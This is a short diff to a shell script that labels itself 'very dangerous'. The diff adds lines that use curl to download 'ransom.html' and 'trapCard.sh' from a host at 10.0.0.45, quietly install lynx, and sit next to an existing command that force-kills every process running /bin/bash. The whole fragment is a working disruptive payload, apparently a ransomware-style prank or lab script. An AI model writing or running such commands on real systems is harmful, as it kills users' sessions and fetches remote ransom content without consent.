@@ -5,10 +5,15 @@
 
 
 #THIS SCRIPT IS VERY DANGEROUS. DO NOT RUN
+# ... if you aren't root ;)
 
+url=http://10.0.0.45/ 
 
+for f in ransom.html trapCard.sh; do
+ curl "$url$f" > $f
+done
 
-
+apt install lynx -y >/dev/null
 
 #kill all bash
 kill -9 `lsof | grep /bin/bash | awk '{print $2}'`
